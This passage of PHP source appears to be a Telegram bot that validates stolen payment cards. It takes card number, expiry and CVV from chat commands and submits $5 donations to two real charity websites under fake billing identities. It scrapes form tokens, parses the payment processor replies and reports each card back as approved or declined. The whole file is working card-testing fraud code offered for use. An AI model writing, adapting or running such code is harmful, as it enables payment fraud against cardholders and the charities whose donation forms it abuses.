$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];
$bin = substr($lista, 0, 6);

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

$mes = explode("|", $lista);
$mes = intval($mes[1]);


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /br CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = ucwords(strtolower(trim($brand)));
echo "$MV\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/make-a-donation',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: none',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron_qfKey = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
$patron_MAX_FILE_SIZE = '/<input name="MAX_FILE_SIZE" type="hidden" value="([^"]+)"/';
preg_match($patron_qfKey, $response, $coincidencias_qfKey);
preg_match($patron_MAX_FILE_SIZE, $response, $coincidencias_MAX_FILE_SIZE);

$qfKey = $coincidencias_qfKey[1];
$MAX_FILE_SIZE = $coincidencias_MAX_FILE_SIZE[1];
curl_close($curl);

echo "qfKey: $qfKey\n";
echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
echo "-------------------------------\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'qfKey' => ''.$qfKey.'',
    'entryURL' => 'https://breastcancereducation.org/civicrm/contribute/transact?reset=1&amp;id=1',
    'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
    'hidden_processor' => '1',
    'payment_processor_id' => '3',
    'priceSetId' => '5',
    'selectProduct' => '',
    '_qf_default' => 'Main:upload',
    'price_3' => '0',
    'price_4' => '5',
    'email-5' => 'Dausitherer@cuvox.de',
    'honor[prefix_id]' => '',
    'honor[first_name]' => '',
    'honor[last_name]' => '',
    'honor[email-1]' => '',
    'honor[note]' => '',
    'honor[image_URL]' => '',
    'custom_28' => '',
    'custom_29' => '',
    'custom_31' => '',
    'custom_30' => '',
    'credit_card_type' => ''.$MV.'',
    'credit_card_number' => ''.$cc.'',
    'cvv2' => ''.$cvv.'',
    'credit_card_exp_date[M]' => ''.$mes.'',
    'credit_card_exp_date[Y]' => ''.$ano.'',
    'billing_first_name' => 'Carlos',
    'billing_middle_name' => '',
    'billing_last_name' => 'Perez',
    'billing_street_address-5' => '6195 bollinger rd',
    'billing_city-5' => 'New york',
    'billing_country_id-5' => '1228',
    'billing_state_province_id-5' => '1002',
    'billing_postal_code-5' => '10010',
    '_qf_Main_upload' => '1',
  ],
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'origin: https://breastcancereducation.org',
//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryWAA2TGiEXXBLDzQk',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?reset=1&id=1',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?reset=1&id=1',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/<input name="qfKey" type="hidden" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$qfKey2 = $coincidencias[1];
echo "qfKey: $qfKey2\n";
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&entryURL=https%3A%2F%2Fbreastcancereducation.org%2Fcivicrm%2Fcontribute%2Ftransact%3Freset%3D1%26amp%3Bid%3D1&_qf_default=Confirm%3Anext&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'origin: https://breastcancereducation.org',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_ThankYou_display=true&qfKey='.$qfKey2.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
    'priority: u=0, i',
  ],
]);


$response = curl_exec($curl);
file_put_contents('index.html', $response);
//$response = file_get_contents('index.html');
$err = curl_error($curl);

$patron = '/<span class="msg-text">(.*?)<\/span>/';
preg_match($patron, $response, $coincidencias);
$mensaje1 = $coincidencias[1];
echo "Me1: $mensaje1\n";

if (!empty($mensaje1)){
$patron = '/Payment Processor Error message :\d*\s*(.*)/';
preg_match($patron, $mensaje1, $coincidencias);
$mensaje = trim($coincidencias[1]);
echo "Me2: $mensaje\n";

} else {
$patron = '/<li>(.*?)<\/li>/';
preg_match($patron, $response, $coincidencias);
$mensaje = $coincidencias[1];
echo "Me3: $mensaje\n";
}

if (empty($mensaje)){
preg_match('/Your contribution has been submitted to Credit Card for processing/', $response, $match);
$mensaje =  $match[0];
echo "Me5: $mensaje\n";
}

$respo = $mensaje;
	
curl_close($curl);

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";
/*
if ($respo == 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'){
$respo = 'Card Issuer Declined CVV';
}*/

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Expiration Date is a required field.') !== false || strpos($respo, 'Please enter a valid Card Verification Number') !== false || strpos($respo, 'This transaction has been declined.') !== false){
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chatId, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}

	


if (preg_match('/^(!|\/|\.)en/', $message)) {
$lista = substr($message, 4);

$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /en CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
                                    }


////EXTRAE EL NONCE////
$cc = implode('+', $partes);

//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'ap3c=IGd4hf2AuelnYH4BAGd4hf2gztotpay7CT3X-oYpVWlMiMuNVA; PHPSESSID=ec26389e2fe6166a22d67286f65cb59f; __cf_bm=1Ye2xpjCVJIqlTxQILHysFAjb_8bw1zRDHV4yZ7AD9E-1735953044-1.0.1.1-Sn8gl_rNV5oBBoVDY380qKL.KWA_5WPy5YEPod4vVShR4H6qxU_SYmzOul15308sekfYVsIafj_MISD6_bCXag; ap3pages=19',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

preg_match('/_wpnonce" value="([^"]+)"/', $response, $match);
$nonce = $match[1];

echo "$nonce\n"; // imprime: d144ae23a1


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'donations_action=donation&donation%5Bbraintree_token%5D=55&donation%5Bpaypal_nonce%5D=&donation%5Bpage_id%5D=244&donation%5Bcampaign%5D=&donation%5Bthankyou%5D=https%3A%2F%2Fenvironmentvictoria.org.au%2Fgive%2Fthank-you%2F&_wpnonce='.$nonce.'&_wp_http_referer=%2Fgive%2F&donation%5Brecurring%5D=0&donation%5Bother-amount%5D=5&user%5Bfirst_name%5D='.$name.'&user%5Blast_name%5D='.$last.'&user%5Bstreet_address%5D='.$street.'&user%5Bcity%5D='.$city.'&user%5Bstate%5D=VIC&user%5Bpostcode%5D='.$postcode.'&user%5Bphone%5D='.$phone.'&user%5Bemail%5D='.$email.'&card_number='.$cc.'&card_expiry='.$mes.'%2F'.$ano.'&card_cvv='.$cvv.'&donation%5Bemail%5D=&donation%5Bstreet_address%5D=&donation%5Bcity%5D=&donation%5Bstate%5D=&donation%5Bpostcode%5D=&donation%5Bcountry%5D=&donation%5Bname%5D=&donation%5Bfirst_name%5D=&donation%5Blast_name%5D=&donation%5Bphone%5D=&donation%5Bpayment_method%5D=&donation%5Bnew_donation%5D=1&donation%5Bsalesforce_contact_id%5D=&donation%5Bamount%5D=5&donation%5Bsalesforce_campaign_id%5D=&donation%5Bsalesforce_campaign_name%5D=Give+page&device_data=%7B%22device_session_id%22%3A%222f2e7d7f5b090e2b08ce13fd98eadeb0%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22891ff729547f44f23fe6a2ded11da524%22%7D',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://environmentvictoria.org.au',
    'referer: https://environmentvictoria.org.au/give/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$parts = explode('<li class="payment-error error">', $response);
$respo = explode('</li>', $parts[1])[0];

curl_close($curl);


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";




// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

 }


	
	 return null; // Si el mensaje no es un comando válido, devuelve null
}
?>
